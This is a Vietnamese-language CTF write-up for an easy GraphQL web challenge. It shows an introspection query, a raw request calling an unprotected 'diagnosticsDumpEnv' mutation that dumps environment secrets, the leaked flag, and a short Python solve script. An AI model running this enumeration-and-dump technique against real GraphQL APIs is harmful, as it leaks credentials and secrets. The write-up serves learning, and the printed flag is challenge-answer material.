# Writeup: WEB CHALLENGE 1 (NovaLingo)

> **Event:** DDC CTF  
> **Category:** Web Exploitation  
> **Difficulty:** Easy  
> **Points:** 28  
> **Description:** *"The Developer API Is Proud of Everything It Knows and Very Eager to Tell You."*  
> **Flag:** `flag{87e2d394-fb1f-4a86-9eb4-d411d3d44e41}`

---

## 1. Tóm tắt (TL;DR)

1. Thử thách cung cấp ứng dụng web **NovaLingo Developer API v2** với endpoint GraphQL tại `POST /graphql`.
2. Dựa vào mô tả *"The Developer API Is Proud of Everything It Knows and Very Eager to Tell You"*, ta xác định lỗ hổng là **GraphQL Introspection** được bật sẵn.
3. Gửi truy vấn Introspection Query để lấy toàn bộ danh sách Type, Query và Mutation.
4. Phát hiện một mutation nhạy cảm: `diagnosticsDumpEnv`.
5. Gọi mutation `diagnosticsDumpEnv` để server dump toàn bộ biến môi trường, thu được flag:
   `flag{87e2d394-fb1f-4a86-9eb4-d411d3d44e41}`.

---

## 2. Phân tích chi tiết

### Bước 1: Khảo sát ứng dụng (Reconnaissance)
- Giao diện web hiển thị bảng điều khiển Developer Dashboard của **NovaLingo**.
- Trang giới thiệu công khai endpoint GraphQL:
  ```http
  POST /graphql
  Content-Type: application/json

  { "query": "{ supportedLanguages }" }
  ```
- Đồng thời có liên kết mở `/schema` và `/playground`.

### Bước 2: Khai thác GraphQL Introspection
Gửi payload GraphQL Introspection để dump toàn bộ Schema:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        description
      }
    }
  }
}
```

Kiểm tra danh sách các mutation của hệ thống, ta thấy:
- `signUp`, `signIn`, `signOut`, `updateProfile`...
- `adminBanUser`, `adminRestoreUser`, `adminGrantPremium`
- **`diagnosticsDumpEnv`**: Mutation dùng để chẩn đoán hệ thống, không yêu cầu đối số và trả về chuỗi thông tin.

### Bước 3: Thực thi Mutation lấy Flag
Gửi request thực thi `diagnosticsDumpEnv`:

```http
POST /graphql HTTP/1.1
Host: <challenge-domain>
Content-Type: application/json

{
  "query": "mutation { diagnosticsDumpEnv }"
}
```

Server phản hồi trả về các biến môi trường của container chứa flag:
```json
{
  "data": {
    "diagnosticsDumpEnv": "... FLAG=flag{87e2d394-fb1f-4a86-9eb4-d411d3d44e41} ..."
  }
}
```

---

## 3. Script giải tự động (`solve_web1.py`)

```python
#!/usr/bin/env python3
import requests
import urllib3
import sys

urllib3.disable_warnings()

def solve(base_url):
    graphql_url = f"{base_url.rstrip('/')}/graphql"
    query = """
    mutation {
        diagnosticsDumpEnv
    }
    """
    try:
        r = requests.post(graphql_url, json={"query": query}, verify=False, timeout=10)
        print("[+] Response:", r.text)
    except Exception as e:
        print("[-] Error:", e)

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else 'https://<challenge-host>'
    solve(url)
```
